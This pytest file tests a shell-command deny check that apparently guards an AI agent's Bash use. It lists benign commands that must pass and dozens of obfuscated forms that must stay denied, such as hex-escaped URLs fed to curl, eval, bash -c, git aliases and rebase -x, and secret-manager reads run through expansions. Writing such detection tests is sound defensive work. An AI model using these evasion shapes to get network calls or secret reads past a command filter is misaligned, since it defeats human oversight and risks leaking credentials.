# SPDX-License-Identifier: Apache-2.0
"""The Bash check recognises an invocation of a tool, not a trigger word in text (#395).

Words in a grep pattern, a commit message, a quoted argument or a heredoc owned by a data command no longer count. Every
way of actually running a network or secret tool with a hidden or dynamic command still does.
"""

from __future__ import annotations

import pytest

from safo import geminibrief

HIDDEN = "$'\\x68ttp://x'"  # the shell turns this into http://x


def denied(command: str) -> bool:
    return geminibrief.shell_command_class(command) is not None


CLEARS = [
    'git commit -m "fix curl handling of \\x41 bytes"',
    "grep -rn 'doppler.*$HOME' docs/",
    'echo "python3 uses \\x41 escapes"',
    "git commit -F - <<'EOF'\nuse curl with \\u00e9\nEOF",
    "cat > notes.md <<'EOF'\nhttps and \\x41 and python3\nEOF",
    'gh pr create --title t --body "uses doppler with $VAR"',
    'ls "$HOME/doppler-notes"',
    "git commit -m \"$(cat <<'EOF'\nfix curl \\x41\nEOF\n)\"",
    "FOO=$(doppler secrets get BAR --plain)",
    "python3 -m pytest tests/test_x.py -k a && grep -c '\\x41' f",
    "cd docs && git log --oneline | grep 'node \\x41'",
    "rg -n 'wget|curl' --glob '*.md' $HOME/src",
]


@pytest.mark.parametrize("command", CLEARS)
def test_a_trigger_word_in_data_does_not_deny(command: str) -> None:
    assert not denied(command), command


STILL_DENIED = [
    # a secret tool run with an expansion, however it is reached
    'doppler run -- bash -c "$CMD"',
    'env doppler run -- sh -c "$X"',
    'sudo doppler secrets get "$NAME"',
    "bash -c 'doppler secrets get $NAME'",
    'sh -c "doppler run -- echo \\$X"',
    'eval "doppler secrets get $NAME"',
    "T=doppler; $T secrets get x",
    "$(printf doppler) secrets get x",
    '"d"oppler secrets get "$X"',
    "'doppler' run -- \"$X\"",
    "find . -exec doppler run -- echo {} $X \\;",
    "nohup doppler secrets get `cat n` &",
    # escapes building a URL for a network tool
    f"curl {HIDDEN}",
    f"command curl {HIDDEN}",
    f"exec curl {HIDDEN}",
    f"cd /tmp && /usr/bin/curl {HIDDEN}",
    f'"curl" {HIDDEN}',
    "curl \"$(printf '\\x68ttp://x')\"",
    "python3 -c \"import urllib.request as u; u.urlopen('\\x68ttp://x')\"",
    "nohup python3 -c \"print('\\x68')\" &",
    "python3 - <<'E'\nimport urllib.request as u; u.urlopen(b'\\x68ttp://x')\nE",
    "python3 <<< \"print('\\x68')\"",
    f'bash <<< "curl {HIDDEN}"',
    f'bash -c "curl {HIDDEN}"',
    f"sh -c 'curl {HIDDEN}'",
    f'eval "curl {HIDDEN}"',
    f"$(echo curl) {HIDDEN}",
    "U=$(printf '\\x68ttp://x'); curl \"$U\"",
    "printf '\\x68ttp://x' | xargs curl",
    "printf '\\x68ttp://x' > u; curl \"$(cat u)\"",
    "sed 's/a/\\x68ttp/e' f | curl -d @- x",
    # written for later, then run
    f"cat > x.sh <<'E'\ncurl {HIDDEN}\nE\nbash x.sh",
    f"cat > x.md <<'E'\ncurl {HIDDEN}\nE\nbash x.md",
    f"tee x.sh <<'E'\ncurl {HIDDEN}\nE",
    f"printf 'curl {HIDDEN}' > x.sh; sh x.sh",
    f"printf 'curl {HIDDEN}'>x.sh; sh x.sh",
    # a data command turned into an executor
    f"git -c alias.x='!curl {HIDDEN}' x",
    f'git rebase -x "curl {HIDDEN}" main',
    f"gh alias set x 'curl {HIDDEN}'",
    # flows into a tool through a variable, a pipe or a file
    f'X={HIDDEN} curl "$X"',
    f'export U={HIDDEN}; curl "$U"',
    f'read -r U <<< {HIDDEN}; curl "$U"',
    "echo -e '\\x68ttp://x' | xargs curl",
    "cat <<'E' | xargs curl\n\\x68ttp://x\nE",
    "printf 'curl \\x68ttp://x' > a.md; . ./*.md",
    "printf 'curl \\x68ttp://x' > a.md; python3 *.md",
    "printf 'curl \\x68ttp://x' > a.md; cp a.md b.sh; sh b.sh",
    "flock l curl $'\\x68ttp://x'",
    "awk 'BEGIN{system(\"curl \\x68ttp://x\")}'",
    "ruby -e 'puts 1' $'\\x68'",
    "sudo -u root nice -n 5 timeout 5 curl $'\\x68ttp://x'",
    "xargs -I{} curl $'\\x68ttp://x'{}",
    "printf 'import urllib.request as u; u.urlopen(\"\\x68ttp://x\")' > a.py; python3 a.py",
    "echo -e '\\x68ttp://x' > u.txt2; curl -d @u.txt2 x",
    # shapes the reader gives up on keep the old, wider answer
    f"(curl {HIDDEN})",
    f"curl {HIDDEN} <(echo x)",
    "function f { curl $'\\x68'; }; f",
]


@pytest.mark.parametrize("command", STILL_DENIED)
def test_a_real_invocation_is_still_denied(command: str) -> None:
    assert denied(command), command


def test_a_document_name_only_embedded_in_an_argument_does_not_deny() -> None:
    assert not denied(f"printf 'curl {HIDDEN}' > a.md; echo data.md")
